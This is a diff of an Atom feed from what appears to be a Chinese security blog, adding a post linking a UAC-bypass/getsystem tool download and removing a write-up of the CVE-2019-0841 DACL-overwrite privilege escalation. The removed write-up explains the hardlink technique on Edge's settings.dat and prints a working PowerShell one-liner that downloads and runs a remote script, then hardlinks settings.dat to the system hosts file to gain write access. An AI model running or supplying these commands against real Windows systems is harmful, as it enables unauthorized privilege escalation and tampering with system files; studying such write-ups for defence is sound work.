@@ -67,6 +67,28 @@
   </entry>
   
   <entry>
+    <title>uac-getsystem</title>
+    <link href="www.ggsec.cn/uac-getsystem.html"/>
+    <id>www.ggsec.cn/uac-getsystem.html</id>
+    <published>2019-08-15T10:51:32.000Z</published>
+    <updated>2019-08-15T10:55:16.274Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/AF29A9C33E8C02B371F167DCF06990D0.jpg" alt="enter description here"><br><a id="more"></a><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/7F45F716F560C7567B40F58CB6EE50AE.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/F9DF6E1F9652CA359C6CD7E0F061A8B1.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/76A36638134BDE99A248FBDF76653595.jpg" alt="enter description here"></p><p><a href="https://github.com/sailay1996/tokenx_privEsc" target="_blank" rel="noopener">https://github.com/sailay1996/tokenx_privEsc</a></p><p><a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/%E9%9C%80%E8%BF%87UAC-getsystem.zip" target="_blank" rel="noopener">https://demonsec666.oss-cn-qingdao.aliyuncs.com/%E9%9C%80%E8%BF%87UAC-getsystem.zip</a><br>已打包</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/AF29A9C33E8C02B371F167DCF06990D0.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="windows" scheme="www.ggsec.cn/categories/windows/"/>
+    
+    
+      <category term="windows" scheme="www.ggsec.cn/tags/windows/"/>
+    
+  </entry>
+  
+  <entry>
     <title>ctftool</title>
     <link href="www.ggsec.cn/ctftool.html"/>
     <id>www.ggsec.cn/ctftool.html</id>
@@ -414,28 +436,6 @@
     <summary type="html">
     
       &lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/0EBBC533E071635742CC4ABA76DAEA75.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
-    
-    </summary>
-    
-      <category term="windows" scheme="www.ggsec.cn/categories/windows/"/>
-    
-    
-      <category term="windows" scheme="www.ggsec.cn/tags/windows/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>DACL权限覆盖提权(CVE-2019-0841)</title>
-    <link href="www.ggsec.cn/CVE-2019-084.html"/>
-    <id>www.ggsec.cn/CVE-2019-084.html</id>
-    <published>2019-04-11T09:39:47.000Z</published>
-    <updated>2019-04-11T11:30:43.000Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20190411_174224.jpg" alt="enter description here"><br><a id="more"></a></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'https://demonsec666.oss-cn-qingdao.aliyuncs.com/CVE-2019-0841.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script><h2 id="1-背景CVE-2019-0841"><a href="#1-背景CVE-2019-0841" class="headerlink" title="1.背景CVE-2019-0841"></a>1.背景CVE-2019-0841</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554975988336.jpg" alt="enter description here"></p><h2 id="2-硬链接"><a href="#2-硬链接" class="headerlink" title="2.硬链接"></a>2.硬链接</h2><p>我们首先看下什么是硬链接。<br><a href="https://krbtgt.pw/dacl-permissions-overwrite-privilege-escalation-cve-2019-0841/" target="_blank" rel="noopener">https://krbtgt.pw/dacl-permissions-overwrite-privilege-escalation-cve-2019-0841/</a><br>1.首先我们使用作者提到的谷歌项目中的CreateHardlink.exe 创建硬链接<br>2.我们创建两个文本文件 一个(src.txt)源文件 一个(target.txt)目标文件。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554976232642.jpg" alt="enter description here"></p><p>3.检查两份文本文档 HASH值。我们并且可以看到两者HASH值相同。.<img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554976406874.jpg" alt="enter description here"></p><p>4.改变target.txt文本文档 HASH值，随即写入该txt文字。并检查两者HASH值。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554976548397.jpg" alt="enter description here" title="可以看到两者HASH值已变化"></p><p>5.那么我们开始创建硬链接<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554976657156.jpg" alt="enter description here" title="我们可以看到两者HASH 随着target的hash变化而变化"></p><p>6.我们可以看到两者HASH 随着target的hash变化而变化，并在任意两者txt文件中随即写入文字都内容相同。</p><h2 id="3-分析作者博文中的内容"><a href="#3-分析作者博文中的内容" class="headerlink" title="3.分析作者博文中的内容."></a>3.分析作者博文中的内容.</h2><p>1.首先事出因Windows AppX中 setting.dat文件 由硬链接处理不当导致的权限覆盖。并由于该文件由NT AUTHORITY\SYSTEM将使用该文件，并且作为低权限用户，您可以完全访问该文件。</p><p>2 settings.dat 存储位置 C:\Users\<username>\AppData\Local\Packages\<packagename>.<img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554977003403.jpg" alt="enter description here"><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554977112874.jpg" alt="enter description here" title="可以看到权限为system"></packagename></username></p><p>3.如果settings.dat 文件损坏，则删除该文件，并由“C:\Windows\System32\settings.dat”，复制到该目录重置。并重启该应用则可重置。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554977219647.jpg" alt="enter description here"></p><p>4 最后作者利用自己写的漏洞进行复现<img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554978682616.jpg" alt="enter description here"></p><ol start="5"><li><p>过程</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554978752002.jpg" alt="enter description here"><br>1.检查要是用setting.dat的应用是否启用，如果是将其结束，因该应用开始则创建不了硬链接<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554978935388.jpg" alt="enter description here"></p><p>2.检查目标文件是否有低权限，如果有则可创建。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554979069769.jpg" alt="enter description here"></p><p>3.创建硬链接<br>1.未结束该使用的应用 setting.dat  (MicrosoftEdge)<br>2.已结束该使用的应用 setting.dat  MicrosoftEdge)<br>3.创建完硬链接后，检查权限未发生变化<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554979252964.jpg" alt="enter description here"></p></li></ol><p> 4.修复权限，启动应用(MicrosoftEdge)<br> <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554979575137.jpg" alt="enter description here"></p><h2 id="4-拓展-powershell"><a href="#4-拓展-powershell" class="headerlink" title="4.拓展(powershell)"></a>4.拓展(powershell)</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/D3xwjxYWsAM8Tca.jpg" alt="enter description here"></p><p><a href="https://twitter.com/rogue_kdc/status/1115664188821639173" target="_blank" rel="noopener">https://twitter.com/rogue_kdc/status/1115664188821639173</a><br>已向原作者和其他开发者提出该拓展<br><a href="https://pastebin.com/jXaz8xMx" target="_blank" rel="noopener">https://pastebin.com/jXaz8xMx</a><br><a href="https://gist.github.com/xillwillx/0377cb2284fa82edb4d2975bab585c45" target="_blank" rel="noopener">https://gist.github.com/xillwillx/0377cb2284fa82edb4d2975bab585c45</a><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554979806898.jpg" alt="enter description here"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iex (New-Object net.webclient).downloadstring(<span class="string">'https://github.com/FuzzySecurity/PowerShell-Sui</span></span><br><span class="line">te/raw/master/Native-HardLink.ps1');</span><br><span class="line">start microsoft-edge:;get-process -name MicrosoftEdge | Stop-process;sleep 2;Native-HardLink -</span><br><span class="line">Link c:\users\username\appdata\local\packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\settings\settings<span class="selector-class">.dat</span> -target c:\windows</span><br><span class="line">\system32\drivers\etc\hosts;start microsoft-edge:;get-process -name Microsoftedge | stop-process</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iex (New-Object net.webclient).downloadstring('https://github.com/FuzzySecurity/PowerShell-Suite/raw/master/Native-HardLink.ps1');start microsoft-edge:;get-process -name MicrosoftEdge | Stop-process;sleep 2;Native-HardLink -Link "$env:localappdata\packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\settings\settings.dat" -target "$env:windir\system32\drivers\etc\hosts";start microsoft-edge:;get-process -name Microsoftedge | stop-process</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0841" target="_blank" rel="noopener">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0841</a><br><a href="https://krbtgt.pw/dacl-permissions-overwrite-privilege-escalation-cve-2019-0841/" target="_blank" rel="noopener">https://krbtgt.pw/dacl-permissions-overwrite-privilege-escalation-cve-2019-0841/</a><br><a href="https://pastebin.com/jXaz8xMx" target="_blank" rel="noopener">https://pastebin.com/jXaz8xMx</a></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20190411_174224.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
     
     </summary>
     
